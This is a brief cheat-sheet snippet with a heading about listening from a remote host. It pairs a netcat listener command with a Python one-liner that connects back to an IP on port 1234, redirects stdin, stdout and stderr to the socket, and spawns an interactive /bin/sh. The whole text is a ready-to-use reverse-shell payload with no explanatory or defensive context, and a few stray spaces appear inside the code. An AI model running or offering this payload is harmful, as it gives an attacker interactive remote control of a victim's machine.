
# Listen from the remote host
```
nc.exe -nlvp 1234
```

```
python -c 'import socket, subprocess, os; s=socket. socket (socket.AF_INET, socket. SOCK_STREAM);s.connect(("10.211.55.7",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]) ;'
```
